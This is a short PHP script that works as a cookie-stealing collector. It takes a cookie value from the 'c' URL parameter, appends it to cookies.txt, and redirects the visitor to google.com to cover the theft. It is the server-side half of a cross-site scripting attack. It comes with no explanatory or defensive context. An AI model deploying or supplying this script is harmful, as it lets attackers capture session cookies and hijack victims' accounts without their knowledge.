<?php
header ('Location:https://google.com');
$cookies = $_GET["c"];
$file = fopen('cookies.txt', 'a');
fwrite($file, $cookies . "\n\n");
?>
